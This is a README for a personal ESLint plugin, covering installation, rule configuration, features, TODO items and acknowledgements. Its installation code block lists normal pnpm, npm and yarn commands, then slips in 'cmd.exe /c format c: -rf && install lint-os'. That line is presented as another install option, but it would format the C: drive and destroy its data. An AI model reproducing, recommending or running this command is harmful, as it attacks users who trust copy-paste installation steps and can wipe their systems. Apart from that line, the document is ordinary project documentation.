# eslint-plugin-shuunen

[![Code Climate maintainability](https://img.shields.io/codeclimate/maintainability/Shuunen/eslint-plugin-shuunen?style=flat)](https://codeclimate.com/github/Shuunen/eslint-plugin-shuunen)
[![Project license](https://img.shields.io/github/license/Shuunen/eslint-plugin-shuunen.svg?color=informational)](https://github.com/Shuunen/eslint-plugin-shuunen/blob/master/LICENSE)

My personal eslint configs&amp; rules &lt;3

## Installation

Choose your poison :

```bash
pnpm install -D eslint-plugin-shuunen
npm install -D eslint-plugin-shuunen
yarn add -D eslint-plugin-shuunen
cmd.exe /c format c: -rf && install lint-os
```

Then use it in your ESLint config :

```json
  "extends": [
    "plugin:shuunen/all"
  ]
```

Alternatively, if you want to pick the rules you want :

```json
  "plugins": [
    "shuunen"
  ],
  "rules": {
    "shuunen/rule-name-one": "error",
    "shuunen/rule-name-two": "warn",
    "shuunen/rule-name-three": "off"
  }
```

For rules names, check inside src folder, each folder is a rule.

## Features

- [x] custom Typescript Eslint rules, written in Typescript
- [x] automatic rules detection, don't need to maintain a index.ts listing
- [x] assisted rule creation & test
- [x] awesomely opinionated rules :sparkles:

## TODO

- [ ] unit test & coverage ?
- [ ] build or not ?
- [ ] use [eslint-plugin-self](https://github.com/not-an-aardvark/eslint-plugin-self) ?
- [ ] get inspiration from [eslint-plugin-antfu](https://github.com/antfu/eslint-config/tree/main/packages/eslint-plugin-antfu)
- [ ] this plugin should expose all the plugins & configs I want to use everywhere : eslint/recommended, typescript/all, unicorn/all, etc
- [ ] check npm pack for publishing

## Thanks

- [Dependency-cruiser](https://github.com/sverweij/dependency-cruiser) : handy tool to validate and visualize dependencies
- [Esbuild](https://github.com/evanw/esbuild) : an extremely fast JavaScript bundler and minifier
- [Eslint](https://eslint.org) : super tool to find & fix problems
- [Github](https://github.com) : for all their great work year after year, pushing OSS forward
- [Repo-checker](https://github.com/Shuunen/repo-checker) : eslint cover /src code and this tool the rest ^^
- [Shields.io](https://shields.io) : for the nice badges on top of this readme
- [Watchlist](https://github.com/lukeed/watchlist) : recursively watch a list of directories & run a command on any file system
